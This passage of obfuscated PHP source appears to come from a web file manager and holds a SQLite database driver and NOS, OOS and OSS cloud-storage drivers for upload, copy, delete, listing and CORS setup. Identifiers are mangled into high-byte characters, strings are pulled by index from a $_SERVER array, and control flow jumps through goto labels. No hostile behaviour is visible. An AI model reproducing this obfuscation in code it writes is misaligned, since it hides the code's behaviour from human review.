(!$this->linkID[$D†¶ÔµÉĞ]) { think_exception($this->linkID[$D†¶ÔµÉĞ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$D†¶ÔµÉĞ]->busyTimeout(30000); if (1 != think_config($e‘ï˜— ‘”[18])) { unset($this->config); } } return $this->linkID[$D†¶ÔµÉĞ]; } public function free() { $this->queryID = null; } public function query($fÖêÆã¦†á) { goto e¤´‡¹ï·ï; b†ÜÖ¢µù: think_status($BÛ—ŒóÛßµ[20]); $this->queryID = $this->_linkID->query($fÖêÆã¦†á); $this->debug(); goto få­³Üºïƒ; a…¼ñÌùˆ–: $this->queryStr = $fÖêÆã¦†á; if ($this->queryID) { $this->free(); } think_action_status($BÛ—ŒóÛßµ[19], 1); goto b†ÜÖ¢µù; få­³Üºïƒ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $E¸›¹„„© = $this->getAll(); $this->numRows = count($E¸›¹„„©); return $E¸›¹„„©; } goto AÆª¸ºÅ£ï; e¤´‡¹ï·ï: $BÛ—ŒóÛßµ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto a…¼ñÌùˆ–; AÆª¸ºÅ£ï: } public function execute($c‡é›ƒ¼Â») { goto Eéô¿²‘è; eŠ÷ò»ªğİ: if (!1 === $BÙéØšº¾ø) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto Aªà‚ë…º¤; cÖƒ¨ã„ÌÔ: think_status($EšñÊİ¸öÇ[20]); $BÙéØšº¾ø = $this->_linkID->exec($c‡é›ƒ¼Â»); $this->debug(); goto eŠ÷ò»ªğİ; eÕÜÒöÜ„: $this->queryStr = $c‡é›ƒ¼Â»; if ($this->queryID) { $this->free(); } think_action_status($EšñÊİ¸öÇ[21], 1); goto cÖƒ¨ã„ÌÔ; Eéô¿²‘è: $EšñÊİ¸öÇ =& $_SERVER[ÍÓÖ€°å]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eÕÜÒöÜ„; Aªà‚ë…º¤: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÍÓÖ€°å][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bğ…¬•ğÑ² = $this->_linkID->query($_SERVER[ÍÓÖ€°å][23]); if (!$bğ…¬•ğÑ²) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $FŞñ˜ïÒ  = $this->_linkID->query($_SERVER[ÍÓÖ€°å][24]); if (!$FŞñ˜ïÒ ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $f”Ç‰­—æÈ = array(); while ($Dæµ¯Áë‘— = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $f”Ç‰­—æÈ[] = $Dæµ¯Áë‘—; } $this->queryID->reset(); return $f”Ç‰­—æÈ; } public function getFields($dÚ“™ŒÆ™˜) { $BÕÌ‡Ãò¢ =& $_SERVER[ÍÓÖ€°å]; $Aë¸ğ«åëâ = $this->query($BÕÌ‡Ãò¢[25] . $dÚ“™ŒÆ™˜ . $BÕÌ‡Ãò¢[26]); $eëêÆ¤°âí = array(); if ($Aë¸ğ«åëâ) { foreach ($Aë¸ğ«åëâ as $bÇ¯Âªš‚ => $e·°•¸ë²¡) { $eëêÆ¤°âí[$e·°•¸ë²¡[$BÕÌ‡Ãò¢[28]]] = array($BÕÌ‡Ãò¢[28] => $e·°•¸ë²¡[$BÕÌ‡Ãò¢[28]], $BÕÌ‡Ãò¢[29] => $e·°•¸ë²¡[$BÕÌ‡Ãò¢[29]], $BÕÌ‡Ãò¢[31] => (bool) ($e·°•¸ë²¡[$BÕÌ‡Ãò¢[31]] === $BÕÌ‡Ãò¢[33]), $BÕÌ‡Ãò¢[34] => $e·°•¸ë²¡[$BÕÌ‡Ãò¢[53]], $BÕÌ‡Ãò¢[36] => (bool) $e·°•¸ë²¡[$BÕÌ‡Ãò¢[54]], $BÕÌ‡Ãò¢[39] => (bool) $e·°•¸ë²¡[$BÕÌ‡Ãò¢[54]]); } } return $eëêÆ¤°âí; } public function getTables($E¡¡Ÿ«£Ø® = '') { $aíó®¶åùç =& $_SERVER[ÍÓÖ€°å]; $EÇ”ËÚà‹‹ = $this->query($aíó®¶åùç[42] . $aíó®¶åùç[43] . $aíó®¶åùç[44]); $EîÓ«¾ áº = array(); foreach ($EÇ”ËÚà‹‹ as $a·–»Ô¯¥™ => $B×œÂÃĞµÅ) { $EîÓ«¾ áº[$a·–»Ô¯¥™] = current($B×œÂÃĞµÅ); } return $EîÓ«¾ áº; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bµÉ„Ø†ä =& $_SERVER[ÍÓÖ€°å]; $this->error = $this->_linkID->lastErrorMsg(); if ($bµÉ„Ø†ä[33] != $this->queryStr) { $this->error .= LNG($bµÉ„Ø†ä[45]) . $this->queryStr; } think_trace($this->error, $bµÉ„Ø†ä[33], $bµÉ„Ø†ä[46]); return $this->error; } public function escapeString($CÅ·¹­Ñğ) { $b´‰••ËÈ =& $_SERVER[ÍÓÖ€°å]; if ($this->_linkID) { return $this->_linkID->escapeString($CÅ·¹­Ñğ); } return str_ireplace($b´‰••ËÈ[55], $b´‰••ËÈ[56], $CÅ·¹­Ñğ); } public function parseLimit($b…¡éã‹ì‘) { $EğÖ·Î“ƒ‰ =& $_SERVER[ÍÓÖ€°å]; $A²´¶Ä ›„ = $EğÖ·Î“ƒ‰[33]; if (!empty($b…¡éã‹ì‘)) { $b…¡éã‹ì‘ = explode($EğÖ·Î“ƒ‰[47], $b…¡éã‹ì‘); if (count($b…¡éã‹ì‘) > 1) { $A²´¶Ä ›„ .= $EğÖ·Î“ƒ‰[48] . $b…¡éã‹ì‘[1] . $EğÖ·Î“ƒ‰[49] . $b…¡éã‹ì‘[0] . $EğÖ·Î“ƒ‰[50]; } else { $A²´¶Ä ›„ .= $EğÖ·Î“ƒ‰[48] . $b…¡éã‹ì‘[0] . $EğÖ·Î“ƒ‰[50]; } } return $A²´¶Ä ›„; } } goto D©¡¯†Î´¿; DÆÎ†àˆ™°: class PathDriverNOS extends PathDriverBaseS3 { public function __construct($fÈ‚Ò°ë­ñ) { parent::__construct($fÈ‚Ò°ë­ñ); $this->client->setSignatureVersion($_SERVER[ÍÓÖ€°å][188]); } public function setBucketCors() { return !1; } public function getBucketCors() { return !1; } public function isBucketCors() { return !0; } public function isFolder($DÎå’—½) { goto EôåŒ´°ÃÀ; EôåŒ´°ÃÀ: $côËùÑ´² =& $_SERVER[ÍÓÖ€°å]; $DÎå’—½ = trim($DÎå’—½, $côËùÑ´²[8]); if (!empty($DÎå’—½)) { $DÎå’—½ .= $côËùÑ´²[8]; } goto a¯ƒ¤è´Õ; a¯ƒ¤è´Õ: $b‘‘˜Ü‘Ï” = $this->getObjectInfo($DÎå’—½); if ($b‘‘˜Ü‘Ï”) { return !0; } $f¢Î’ƒ…Âõ = $this->listObjs($DÎå’—½, null, 3, $côËùÑ´²[8]); goto d¿º—±ñ”Œ; d¿º—±ñ”Œ: return count($f¢Î’ƒ…Âõ) == 1 ? !1 : !0; goto bÛŒÎ…Ÿ°; bÛŒÎ…Ÿ°: } public function fileInfoImage($f¤×î“‚», &$dÂŒ¾âÆÂÆ) { } public function setContent($EÄ”‚ˆÖÀŞ, $eÇ ÷‚·½¥ = '', $C¼õÁÛîØé = false) { $FÔ È²ù =& $_SERVER[ÍÓÖ€°å]; $EÄ”‚ˆÖÀŞ = $C¼õÁÛîØé ? trim($EÄ”‚ˆÖÀŞ, $FÔ È²ù[8]) . $FÔ È²ù[8] : $EÄ”‚ˆÖÀŞ; $FÉ±‡ã¨Î° = get_file_mime(get_path_ext($EÄ”‚ˆÖÀŞ)); $aˆçŠ»Ï§¨ = $this->client->putObject($eÇ ÷‚·½¥, $this->bucket, $EÄ”‚ˆÖÀŞ, $FÔ È²ù[173], array(), $FÉ±‡ã¨Î°); return $aˆçŠ»Ï§¨ ? !0 : !1; } public function getObjectInfo($a§Ë–ÎÉëÇ) { $Fç–ÖíÏÃÖ =& $_SERVER[ÍÓÖ€°å]; $fÜíõâÙØø = $this->client->getObjectInfo($this->bucket, $a§Ë–ÎÉëÇ); if (!isset($fÜíõâÙØø[$Fç–ÖíÏÃÖ[195]]) && isset($fÜíõâÙØø[$Fç–ÖíÏÃÖ[870]])) { $fÜíõâÙØø[$Fç–ÖíÏÃÖ[195]] = $fÜíõâÙØø[$Fç–ÖíÏÃÖ[870]]; } return $fÜíõâÙØø; } public function upload($cÇ°‚µÀ, $B‹ÛñÄÈØ», $Dá±ˆ‹‚ïÈ = false, $f‰÷îƒ¶Æ = REPEAT_REPLACE) { $Cìƒ±Ã©ù =& $_SERVER[ÍÓÖ€°å]; $EÅ‰åÇ„Üô = array(); $c¼ÂµÑäÆ = array($Cìƒ±Ã©ù[187] => get_file_mime(get_path_ext($cÇ°‚µÀ))); if (IO::size($B‹ÛñÄÈØ») <= 1024 * 1024 * 200) { $fÈòŒÒÙ…¼ = $this->client->putObjectFile($B‹ÛñÄÈØ», $this->bucket, $cÇ°‚µÀ, $Cìƒ±Ã©ù[173], $EÅ‰åÇ„Üô, $c¼ÂµÑäÆ); return !empty($fÈòŒÒÙ…¼) ? !0 : !1; } $DçˆÔµ´³Œ = $this->client->multiUploadObject($B‹ÛñÄÈØ», $this->bucket, trim($cÇ°‚µÀ, $Cìƒ±Ã©ù[8]), $EÅ‰åÇ„Üô, $c¼ÂµÑäÆ); return $DçˆÔµ´³Œ ? $this->getPathOuter($cÇ°‚µÀ) : !1; } public function blockChain($Bê±½å²Ï‹, $dÑÁ¨–²») { $dÂ‡êˆÔ½É =& $_SERVER[ÍÓÖ€°å]; $c“ìİ¼íÕ‚ = $this->getObjectInfo($Bê±½å²Ï‹); if (!$c“ìİ¼íÕ‚) { return !1; } return $this->client->copyObject($this->bucket, $Bê±½å²Ï‹, $this->bucket, $Bê±½å²Ï‹, $dÂ‡êˆÔ½É[173], array(), $dÑÁ¨–²», $dÂ‡êˆÔ½É[871], !0); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($E½Ò¦à‚ºø) { parent::__construct($E½Ò¦à‚ºø); $this->signatureVersion($_SERVER[ÍÓÖ€°å][188]); } } class PathDriverOSS extends PathDriverBase { private $accessKey = ''; private $secret = ''; private $domain = ''; private $bucket = ''; private $bucketAcl = ''; private $endpoint = null; private $client = null; public function __construct($aåæ±îÀ°) { parent::__construct(); include_once SDK_DIR . $_SERVER[ÍÓÖ€°å][872]; $this->_init($aåæ±îÀ°); } private function _init($Cçä½„à˜Ì) { foreach ($Cçä½„à˜Ì as $EÌƒòµ ¦ => $E’Å£œßñÕ) { if (isset($this->{$EÌƒòµ ¦})) { $this->{$EÌƒòµ ¦} = $E’Å£œßñÕ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[ÍÓÖ€°å][873], !1); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); } public function setBucketCors() { goto AÒá¾Äö¬„; bŠè”Å¢À: $b¯®µ÷Í->addAllowedOrigin($F»Î¥éÜ¬[874]); $b¯®µ÷Í->addAllowedMethod($F»Î¥éÜ¬[875]); $b¯®µ÷Í->addAllowedMethod($F»Î¥éÜ¬[876]); goto eÊ‡îåó; eÊ‡îåó: $b¯®µ÷Í->addAllowedMethod($F»Î¥éÜ¬[877]); $b¯®µ÷Í->addAllowedMethod($F»Î¥éÜ¬[878]); $b¯®µ÷Í->addAllowedMethod($F»Î¥éÜ¬[143]); goto b»è§×„Ö„; b»è§×„Ö„: $b¯®µ÷Í->setMaxAgeSeconds(600); $b¯®µ÷Í->addExposeHeader($F»Î¥éÜ¬[879]); $b¯®µ÷Í->addAllowedHeader($F»Î¥éÜ¬[874]); goto D‡‘ì·Æê; D‡‘ì·Æê: $e‡·ÍÀòîø->addRule($b¯®µ÷Í); try { $this->client->putBucketCors($this->bucket, $e‡·ÍÀòîø); } catch (OSS\Core\OssException $fÍ¨³…ğÌ) { return !1; } return !0; goto Aé­Ü©‰è; AÒá¾Äö¬„: $F»Î¥éÜ¬ =& $_SERVER[ÍÓÖ€°å]; $e‡·ÍÀòîø = new OSS\Model\CorsConfig(); $b¯®µ÷Í = new OSS\Model\CorsRule(); goto bŠè”Å¢À; Aé­Ü©‰è: } public function getBucketCors() { goto bÏ‹éôàéÊ; bóéÃë¤è¤: $Eô«Áº˜ = $eÕ‰Ùèê—ö[0]->getMaxAgeSeconds(); $E½âÕÜö‘Í = $eÕ‰Ùèê—ö[0]->getExposeHeaders(); $eÍŠÔÉ³ = $eÕ‰Ùèê—ö[0]->getAllowedHeaders(); goto aª‡ŸË¸°¹; bÏ‹éôàéÊ: $DÙº¦í…•Ç =& $_SERVER[ÍÓÖ€°å]; $aõì¢–™µï = null; try { $aõì¢–™µï = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Fèèöİö) { return null; } goto d‰—‡ãæÄô; d‰—‡ãæÄô: if (!$aõì¢–™µï || !($eÕ‰Ùèê—ö = $aõì¢–™µï->getRules())) { return null; } $dâ»õÉªæâ = $eÕ‰Ùèê—ö[0]->getAllowedOrigins(); $c‡¤ß‘ÚŒ = $eÕ‰Ùèê—ö[0]->getAllowedMethods(); goto bóéÃë¤è¤; aª‡ŸË¸°¹: return array($DÙº¦í…•Ç[163] => isset($dâ»õÉªæâ[0]) ? $dâ»õÉªæâ[0] : $DÙº¦í…•Ç[33], $DÙº¦í…•Ç[167] => $c‡¤ß‘ÚŒ, $DÙº¦í…•Ç[880] => $Eô«Áº˜, $DÙº¦í…•Ç[881] => isset($E½âÕÜö‘Í[0]) ? $E½âÕÜö‘Í[0] : $DÙº¦í…•Ç[33], $DÙº¦í…•Ç[165] => isset($eÍŠÔÉ³[0]) ? $eÍŠÔÉ³[0] : $DÙº¦í…•Ç[33]); goto eÀéëÕ±´; eÀéëÕ±´: } public function isBucketCors() { goto d©ã½§ƒ‚¦; c‡£®„‚ê¯: $B‘®ÉÊ¥Ô = array($b‘×ô‹ÏØ¯[168], $b‘×ô‹ÏØ¯[169], $b‘×ô‹ÏØ¯[170], $b‘×ô‹ÏØ¯[171], $b‘×ô‹ÏØ¯[172]); $a­Ä˜âˆ¦§ = array_diff($B‘®ÉÊ¥Ô, $Dá´Ãô…ÌÔ); return empty($a­Ä˜âˆ¦§); goto Ešê¦ßº˜; d©ã½§ƒ‚¦: $b‘×ô‹ÏØ¯ =& $_SERVER[ÍÓÖ€°å]; $B½Ñ‡Ğ õ· = $this->getBucketCors(); if (!$B½Ñ‡Ğ õ· || !is_array($B½Ñ‡Ğ õ·)) { return !1; } goto F³íÙ´ÆöÊ; F³íÙ´ÆöÊ: if ($B½Ñ‡Ğ õ·[$b‘×ô‹ÏØ¯[163]] != $b‘×ô‹ÏØ¯[164] || $B½Ñ‡Ğ õ·[$b‘×ô‹ÏØ¯[165]] != $b‘×ô‹ÏØ¯[164]) { return !1; } $Dá´Ãô…ÌÔ = array_map($b‘×ô‹ÏØ¯[166], $B½Ñ‡Ğ õ·[$b‘×ô‹ÏØ¯[167]]); if (!is_array($Dá´Ãô…ÌÔ)) { $Dá´Ãô…ÌÔ = array(); } goto c‡£®„‚ê¯; Ešê¦ßº˜: } public function mkfile($Dƒ¶§å´”ë, $d¨ŠÄ°ª = '', $D¼Ø¨Šİøï = REPEAT_RENAME) { $F¨¾Ûâğ´Ê = $this->setContent($Dƒ¶§å´”ë, $d¨ŠÄ°ª); if ($F¨¾Ûâğ´Ê !== !1) { return $this->getPathOuter($Dƒ¶§å´”ë); } return !1; } public function mkdir($a…Ì­´ªÛ, $aîñ†ğß¹ = REPEAT_SKIP) { if ($this->isFolder($a…Ì­´ªÛ)) { return $this->getPathOuter($a…Ì­´ªÛ); } try { $cÄÙ…¨–¯¾ = $this->pathEncode($a…Ì­´ªÛ); $this->client->createObjectDir($this->bucket, $cÄÙ…¨–¯¾); } catch (OSS\Core\OssException $cØÕ„½à…) { return !1; } return $this->getPathOuter($a…Ì­´ªÛ); } private function fileList($E‘Ù×´ÇÍ, $f›Ø›¾ß‰ = '', $aĞÂ„ÒšŠĞ = 0) { goto eªÓ•“ê¯²; A‡ïŒÍëÂ‚: $c™ÇÀçù = $a•¡‹ø¸çĞ[33]; $d·¡…ˆÔ İ = 1000; $C‹„Ÿ¦âİê = $D¶Ö†ã®Ó = array(); goto d¶ÀËÂÀ¨³; eªÓ•“ê¯²: $a•¡‹ø¸çĞ =& $_SERVER[ÍÓÖ€°å]; $E‘Ù×´ÇÍ = trim($E‘Ù×´ÇÍ, $a•¡‹ø¸çĞ[8]); $aÄé×Å«Šñ = empty($E‘Ù×´ÇÍ) ? $a•¡‹ø¸çĞ[33] : $E‘Ù×´ÇÍ . $a•¡‹ø¸çĞ[8]; goto A‡ïŒÍëÂ‚; d¶ÀËÂÀ¨³: while (!0) { $dƒÔ—ƒ­ = array($a•¡‹ø¸çĞ[882] => $f›Ø›¾ß‰, $a•¡‹ø¸çĞ[174] => $aÄé×Å«Šñ, $a•¡‹ø¸çĞ[883] => $d·¡…ˆÔ İ, $a•¡‹ø¸çĞ[884] => $c™ÇÀçù); try { $DÃ’†’ÈÚ÷ = $this->client->listObjects($this->bucket, $dƒÔ—ƒ­); } catch (OSS\Core\OssException $E¯èñªôÎ) { break; } $c™ÇÀçù = $DÃ’†’ÈÚ÷->getNextMarker(); $b‡Æ¦ÃĞ”• = $DÃ’†’ÈÚ÷->getObjectList(); $BÚå°¶ÇßÉ = $DÃ’†’ÈÚ÷->getPrefixList(); foreach ($b‡Æ¦ÃĞ”• as $EŸŠÁÍ¡©Ö) { if ($EŸŠÁÍ¡©Ö->getKey() == $aÄé×Å«Šñ) { continue; } $B†·÷Óºãá = $EŸŠÁÍ¡©Ö->getKey(); if ($aĞÂ„ÒšŠĞ) { $B†·÷Óºãá = array($a•¡‹ø¸çĞ[28] => $B†·÷Óºãá, $a•¡‹ø¸çĞ[78] => $EŸŠÁÍ¡©Ö->getSize(), $a•¡‹ø¸çĞ[178] => strtotime($EŸŠÁÍ¡©Ö->getLastModified())); } $D¶Ö†ã®Ó[] = $B†·÷Óºãá; } foreach ($BÚå°¶ÇßÉ as $dáš¸ÓåÊó) { $C‹„Ÿ¦âİê[] = $dáš¸ÓåÊó->getPrefix(); } if ($c™ÇÀçù === $a•¡‹ø¸çĞ[33]) { break; } } return array($a•¡‹ø¸çĞ[75] => $C‹„Ÿ¦âİê, $a•¡‹ø¸çĞ[74] => $D¶Ö†ã®Ó); goto DçñçˆŠ; DçñçˆŠ: } public function copyFile($A¤£ØÚ÷œ, $FµğØºÙßÜ) { $E“éªƒ¬ÖØ = $this->size($A¤£ØÚ÷œ); if ($E“éªƒ¬ÖØ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $this->pathEncode($A¤£ØÚ÷œ), $this->bucket, $this->pathEncode($FµğØºÙßÜ)); } catch (OSS\Core\OssException $e›æõÕ‰å) { return !1; } return !0; } return $this->multiCopyObject($A¤£ØÚ÷œ, $FµğØºÙßÜ, $E“éªƒ¬ÖØ); } private function multiCopyObject($AÓ²†ñÃ£, $aç‹³”ò¨õ, $bğ¡è“ØÈé) { $CˆÍ¢–˜¤ù =& $_SERVER[ÍÓÖ€°å]; try { goto A”÷ÉÉ§Ã­; A”÷ÉÉ§Ã­: $Dß¤‡…‘ø = array(); if ($eÌ“µ˜î·´ = $this->hashMd5($AÓ²†ñÃ£)) { $Dß¤‡…‘ø = array(OSS\OssClient::OSS_HEADERS => array($CˆÍ¢–˜¤ù[885] => $eÌ“µ˜î·´)); } $eŠÈ“‹ÏÒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($aç‹³”ò¨õ), $Dß¤‡…‘ø); goto C‚à×Â­Ÿö; eé¢ÔÅí: foreach ($d‚¦–»±ªº as $FƒßƒÆèø× => $AáÌÕ¤½Ì) { $d÷×»êöŸ¹[] = array($CˆÍ¢–˜¤ù[889] => $FƒßƒÆèø× + 1, $CˆÍ¢–˜¤ù[890] => $AáÌÕ¤½Ì); } $DÎ®Ğœ£² = $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($aç‹³”ò¨õ), $eŠÈ“‹ÏÒ, $d÷×»êöŸ¹); goto Cµ¨ ®ïØë; C‚à×Â­Ÿö: $C…•®öÀÜÅ = 1; $Bñ¸±èÏŸ = 0; $d‚¦–»±ªº = array(); goto Aì†­›¿ùØ; Aì†­›¿ùØ: $dù‰Òæì£ = $this->client->generateMultiuploadParts($bğ¡è“ØÈé, 1024 * 1024 * 10); foreach ($dù‰Òæì£ as $FƒßƒÆèø× => $bÅùÁËâ’) { $A•£¬¯î = $Bñ¸±èÏŸ + (int) $bÅùÁËâ’[$CˆÍ¢–˜¤ù[886]]; $f±ÛÔâšĞ’ = (int) $bÅùÁËâ’[$CˆÍ¢–˜¤ù[317]] + $A•£¬¯î - 1; $c²­ù‡Ä±³ = array($CˆÍ¢–˜¤ù[887] => $A•£¬¯î, $CˆÍ¢–˜¤ù[888] => $f±ÛÔâšĞ’); $d‚¦–»±ªº[] = $this->client->uploadPartCopy($this->bucket, $this->pathEncode($AÓ²†ñÃ£), $this->bucket, $this->pathEncode($aç‹³”ò¨õ), $C…•®öÀÜÅ, $eŠÈ“‹ÏÒ, $c²­ù‡Ä±³); $C…•®öÀÜÅ = $C…•®öÀÜÅ + 1; } $d÷×»êöŸ¹ = array(); goto eé¢ÔÅí; Cµ¨ ®ïØë: } catch (OSS\Core\OssException $cÀ¹îù) { return !1; } return !0; } public function moveFile($eØŞÏñ§ğ‚, $BˆöÓ›è¡) { if ($this->copyFile($eØŞÏñ§ğ‚, $BˆöÓ›è¡)) { $this->remove($eØŞÏñ§ğ‚); return !0; } return !1; } public function delFile($aÀïö´óŸ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($aÀïö´óŸ)); } catch (OSS\Core\OssException $aå—ÌÀŞ‚Ş) { return !1; } return !0; } public function delFolder($BÕ¦å—î“£) { $f³èó®¢¬Ï =& $_SERVER[ÍÓÖ€°å]; $b‹…÷Öâ·Ñ = $this->fileList($BÕ¦å—î“£); if (!empty($BÕ¦å—î“£) && !in_array(trim($BÕ¦å—î“£, $f³èó®¢¬Ï[8]) . $f³èó®¢¬Ï[8], $b‹…÷Öâ·Ñ[$f³èó®¢¬Ï[74]])) { $b‹…÷Öâ·Ñ[$f³èó®¢¬Ï[74]][] = trim($BÕ¦å—î“£, $f³èó®¢¬Ï[8]) . $f³èó®¢¬Ï[8]; } foreach (array_chunk($b‹…÷Öâ·Ñ[$f³èó®¢¬Ï[74]], 1000) as $eø“Ùø½ä‘) { try { $this->client->deleteObjects($this->bucket, $eø“Ùø½ä‘); } catch (OSS\Core\OssException $eìÖÖƒÙãã) { return !1; } } return !0; } public function rename($aï•·©ˆŒ­, $eµæ®¯„‚Ó) { return $this->renameObject($aï•·©ˆŒ­, $eµæ®¯„‚Ó); } public function size($Eî÷ÌÜÁ Ï) { if (!$this->isFile($Eî÷ÌÜÁ Ï)) { return 0; } try { $fíÎÊ‚ƒ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($Eî÷ÌÜÁ Ï)); } catch (OSS\Core\OssException $fÍ¸Äº“°§) { return !1; } return $fíÎÊ‚ƒ[$_SERVER[ÍÓÖ€°å][891]] + 0; } public function info($aÆµİŞÑ­) { if ($this->isFolder($aÆµİŞÑ­)) { return $this->folderInfo($aÆµİŞÑ­, 1); } if (!$this->isFile($aÆµİŞÑ­)) { return !1; } return $this->fileInfo($aÆµİŞÑ­); } private function fileInfo($E¬¼à¦“ô¼, $c÷”ÑÇ‹Ë = array(), $fó·å‰Âö = false) { goto fÇ´óƒ³µ; dªÖ¤ëŒé›: if (isset($c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[175]])) { $EÉÓ© ¹…Ü[$bé¼Ââ¹Ôé[175]] = $c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[175]]; } return $EÉÓ© ¹…Ü; goto cèÛã±Şâ×; fÇ´óƒ³µ: $bé¼Ââ¹Ôé =& $_SERVER[ÍÓÖ€°å]; if ($fó·å‰Âö) { return array($bé¼Ââ¹Ôé[28] => $this->pathThis($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[76] => $this->getPathOuter($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[29] => $bé¼Ââ¹Ôé[155], $bé¼Ââ¹Ôé[148] => $this->ext($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[78] => isset($c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[78]]) ? $c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[78]] : 0); } $EÉÓ© ¹…Ü = array($bé¼Ââ¹Ôé[28] => $this->pathThis($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[76] => $this->getPathOuter($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[29] => $bé¼Ââ¹Ôé[155], $bé¼Ââ¹Ôé[175] => $bé¼Ââ¹Ôé[50], $bé¼Ââ¹Ôé[101] => $bé¼Ââ¹Ôé[50], $bé¼Ââ¹Ôé[78] => 0, $bé¼Ââ¹Ôé[148] => $this->ext($E¬¼à¦“ô¼), $bé¼Ââ¹Ôé[176] => !0, $bé¼Ââ¹Ôé[177] => !0); goto aÕŸˆë‡å; aÕŸˆë‡å: if (empty($c÷”ÑÇ‹Ë)) { $f†‘ã½œµ° = $this->client->getObjectMeta($this->bucket, $this->pathEncode($E¬¼à¦“ô¼)); if (!$f†‘ã½œµ°) { return $EÉÓ© ¹…Ü; } $c÷”ÑÇ‹Ë = array($bé¼Ââ¹Ôé[175] => $f†‘ã½œµ°[$bé¼Ââ¹Ôé[892]][$bé¼Ââ¹Ôé[893]], $bé¼Ââ¹Ôé[178] => strtotime($f†‘ã½œµ°[$bé¼Ââ¹Ôé[894]]), $bé¼Ââ¹Ôé[78] => $f†‘ã½œµ°[$bé¼Ââ¹Ôé[891]] + 0); $this->fileInfoImage($E¬¼à¦“ô¼, $EÉÓ© ¹…Ü); } $EÉÓ© ¹…Ü[$bé¼Ââ¹Ôé[101]] = $c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[178]]; $EÉÓ© ¹…Ü[$bé¼Ââ¹Ôé[78]] = $c÷”ÑÇ‹Ë[$bé¼Ââ¹Ôé[78]]; goto dªÖ¤ëŒé›; cèÛã±Şâ×: } private function folderInfo($Aî††­‰·‹, $Eœ‚–×·í™ = 0, $fçÛ³±ñŞ… = false) { $Eç’ÕŸ¥Ë =& $_SERVER[ÍÓÖ€°å]; if ($fçÛ³±ñŞ…) { return array($Eç’ÕŸ¥Ë[28] => $this->pathThis($Aî††­‰·‹), $Eç’ÕŸ¥Ë[76] => $this->getPathOuter($Eç’ÕŸ¥Ë[8] . $Aî††­‰·‹), $Eç’ÕŸ¥Ë[29] => $Eç’ÕŸ¥Ë[77]); } $aìÍí—–· = array($Eç’ÕŸ¥Ë[28] => $this->pathThis($Aî††­‰·‹), $Eç’ÕŸ¥Ë[76] => $this->getPathOuter($Eç’ÕŸ¥Ë[8] . $Aî††­‰·‹), $Eç’ÕŸ¥Ë[29] => $Eç’ÕŸ¥Ë[77], $Eç’ÕŸ¥Ë[175] => $Eç’ÕŸ¥Ë[50], $Eç’ÕŸ¥Ë[101] => $Eç’ÕŸ¥Ë[50], $Eç’ÕŸ¥Ë[179] => !1, $Eç’ÕŸ¥Ë[180] => !1, $Eç’ÕŸ¥Ë[176] => !0, $Eç’ÕŸ¥Ë[177] => !0); if ($Eœ‚–×·í™) { $aìÍí—–·[$Eç’ÕŸ¥Ë[179]] = $this->has($Aî††­‰·‹, !1); $aìÍí—–·[$Eç’ÕŸ¥Ë[180]] = $this->has($Aî††­‰·‹, !0); } return $aìÍí—–·; } public function exist($DĞß¸ˆÁ‘Í) { if ($this->isFile($DĞß¸ˆÁ‘Í) || $this->isFolder($DĞß¸ˆÁ‘Í)) { return !0; } return !1; } public function isFile($fŒëõ£×µÔ) { if ($this->isFolder($fŒëõ£×µÔ)) { return !1; } try { return $this->client->doesObjectExist($this->bucket, $this->pathEncode($fŒëõ£×µÔ)); } catch (OSS\Core\OssException $EÍ«í¸õÜà) { return !1; } } public function isFolder($dÆÂÆ²’ù) { $BïĞ±‚ê‘î =& $_SERVER[ÍÓÖ€°å]; try { $dÆÂÆ²’ù = trim($dÆÂÆ²’ù, $BïĞ±‚ê‘î[8]); $C÷™¼†Æ¡§ = array($BïĞ±‚ê‘î[882] => $BïĞ±‚ê‘î[8], $BïĞ±‚ê‘î[174] => empty($dÆÂÆ²’ù) ? $BïĞ±‚ê‘î[33] : $dÆÂÆ²’ù . $BïĞ±‚ê‘î[8], $BïĞ±‚ê‘î[883] => 1, $BïĞ±‚ê‘î[884] => $BïĞ±‚ê‘î[33]); $fàáñÒî®¦ = $this->client->listObjects($this->bucket, $C÷™¼†Æ¡§); } catch (OSS\Core\OssException $b¨ÉÈì°¢Œ) { return !1; } $fù‰òˆ¦†ï = $fàáñÒî®¦->getObjectList(); $E†¢‘²à£î = $fàáñÒî®¦->getPrefixList(); return empty($fù‰òˆ¦†ï) && empty($E†¢‘²à£î) ? !1 : !0; } public function listPath($e±”ŒçÁàÇ, $b†ï«ªéƒ = false, $C‡í´ó×ã = false) { $BËºŒ½•…” =& $_SERVER[ÍÓÖ€°å]; $b”Åªå‹Õß = $this->fileList($e±”ŒçÁàÇ, $BËºŒ½•…”[8], 1); foreach 